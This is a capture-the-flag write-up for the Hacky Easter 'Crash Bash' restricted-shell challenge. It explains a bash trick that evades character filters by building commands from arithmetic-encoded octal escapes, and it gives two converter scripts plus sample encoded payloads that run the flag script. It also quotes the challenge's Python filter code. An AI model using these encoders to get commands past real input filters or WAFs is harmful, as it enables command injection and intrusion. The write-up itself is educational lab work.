# Crash Bash

## Description

Can you crash the bash?

The password is B4sh_br0TH3rs

Connect using nc ch.hackyeaster.com 2303

Note: The service is restarted every hour at x:00.

<img width="351" alt="image" src="https://user-images.githubusercontent.com/2973929/234140051-1756aaaf-0755-4869-9753-3242fb4f15db.png">

# Solution 1

The challenge is basically a limited shell that will filter almost everything you try, including letters, `.` (dot) and a lot of other things.
Luckily, just a few days before a friend showed me a WAF bypass he found using bash, that I will go through quickly:

```
${0}<<<$\'\\$(($((1<<1))#10011010))\\$(($((1<<1))#10100011))\'
```
This is just a `ls` command.
Breaking it into parts:
- `${0}` in your terminal will mean the shell you're in, in this case, `bash`
- `<<<` indicates you're passing a [Here String](https://tldp.org/LDP/abs/html/x17837.html) to something.
- `$(( ... ))` is the bash calculator
- `1<<1` is a [Shift operation](https://www.interviewcake.com/concept/java/bit-shift) that results in `2`
- `10011010` is decimal `154` represented in binary. When preceded with a `\`, most shells will take it as octal. \154 = `l`
- `10100011` is decimal `163` represented in binary. When preceded with a `\`, most shells will take it as octal. \163 = `s`

So in steps what we've got:
`bash<<<$\'\\$((2#10011010))\\$((2#10100011))\'`

then:
`bash<<<$\'\\154\\163\'`

then:
`bash<<<$\'ls'`

Basically it's a bypass that uses a very strict and small charset. My mind went instantly there.
After a few minutes trying to figure out how to add spaces to that bypass, i've come up with this converter:

```bash
string=$*
string=$(echo -n "$string" | xxd -p | tr -d '\n')
echo "string: $string"
str='${0}<<<{$\'"'"
while read -n2 char; do
        (( ${#char} != 2 )) && continue
        [ "$char" == "20" ] && { str+="\\',$\\'"; continue; }
        octal=$(printf %o "0x$char")
        bin=$(echo "obase=2; $octal" | bc)
        str+="\\\\\$((\$((1<<1))#$bin))"

done <<< "$string"
str+='\'"',}"
echo $str
```

```
./convert.sh /printflag.sh B4sh_br0TH3rs
string: 2f7072696e74666c61672e736820423473685f6272305448337273
${0}<<<{$\'\\$(($((1<<1))#111001))\\$(($((1<<1))#10100000))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10010111))\\$(($((1<<1))#10011100))\\$(($((1<<1))#10100100))\\$(($((1<<1))#10010010))\\$(($((1<<1))#10011010))\\$(($((1<<1))#10001101))\\$(($((1<<1))#10010011))\\$(($((1<<1))#111000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\',$\'\\$(($((1<<1))#1100110))\\$(($((1<<1))#1000000))\\$(($((1<<1))#10100011))\\$(($((1<<1))#10010110))\\$(($((1<<1))#10001001))\\$(($((1<<1))#10001110))\\$(($((1<<1))#10100010))\\$(($((1<<1))#111100))\\$(($((1<<1))#1111100))\\$(($((1<<1))#1101110))\\$(($((1<<1))#111111))\\$(($((1<<1))#10100010))\\$(($((1<<1))#10100011))\',}
```

then i just had to get the flag:

<img width="726" alt="image" src="https://user-images.githubusercontent.com/2973929/234142293-7f6fe5fd-d15c-402e-b088-2e1852c219fc.png">

## Solution 2:

I mean... I was happy that I had solved that challenge, but I spent the rest of the days thinking my solution was overkill. As I ended up having a way to run any command I wanted, I could, for example, read the code for the limited shell:

```python
#!/bin/usr/env python3

import subprocess
import re
import os
import random
from inputimeout import inputimeout, TimeoutOccurred

NOT_ALLOWED = re.compile("[a-z*?.]")

def create_tmp_dir():
    random_name = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for x in range(32))
    dir_name = f'/tmp/{random_name}'
    os.mkdir(dir_name)
    return dir_name

def main(directory):
    print('Welcome to Crash Bash!')
    print('To get the flag, call /printflag.sh with the password!')
    print('Enter "q" to quit.')
    print('----------------------')
    do_run = True
    while do_run:
        try:
            inp = inputimeout(prompt='crashbash$ ', timeout=30)
            if 'q' == inp:
                print('Bye!')
                do_run = False
            elif NOT_ALLOWED.search(inp):
                print('Invalid input, bash crashed!')
            else:
                try:
                    subprocess.run(['/bin/bash', '-c', inp], stdin=subprocess.PIPE, timeout=20, cwd=directory)
                except subprocess.TimeoutExpired:
                    print("Timeout")
        except:
            print('Timeout, bye!')
            do_run = False

if __name__ == '__main__':
    main(create_tmp_dir())
```

So I was sure it could be done "easier".
After checking `env`, I found out that there was a variable named REMOTE_HOST that held the IP connected to the box.
So that's what I came up with:

```bash
#!/bin/bash
comando="$*"
REMOTE_HOST=1.2.3.4 # mocking variable content inside the box
A=ABCDEFGHIJKLMNOPQRSTUVWXYZ B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/}
echo -n 'A=ABCDEFGHIJKLMNOPQRSTUVWXYZ;B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/};'

while read -n1 char; do
        (( ${#char} != 1 )) && { print+=" "; echo -n " "; continue; }
        for (( i=0; i<=${#B}; i++ )); do
                [ "${B:$i:1}" == "$char" ] && { echo -n "\${B:$i:1}"; break;}
                (( i == ${#B} )) && { echo "faltou $char"; exit; }
        done
done <<< "$comando"
```

```
./convert2.sh /printflag.sh B4sh_br0TH3rs
A=ABCDEFGHIJKLMNOPQRSTUVWXYZ;B=$A${A,,}0123456789_/${REMOTE_HOST//[0-9]/};${B:63:1}${B:41:1}${B:43:1}${B:34:1}${B:39:1}${B:45:1}${B:31:1}${B:37:1}${B:26:1}${B:32:1}${B:64:1}${B:44:1}${B:33:1} ${B:1:1}${B:56:1}${B:44:1}${B:33:1}${B:62:1}${B:27:1}${B:43:1}${B:52:1}${B:19:1}${B:7:1}${B:55:1}${B:43:1}${B:44:1}
```

<img width="722" alt="image" src="https://user-images.githubusercontent.com/2973929/234144048-423e3a2c-0ed6-4fdd-9a27-620927876c5b.png">




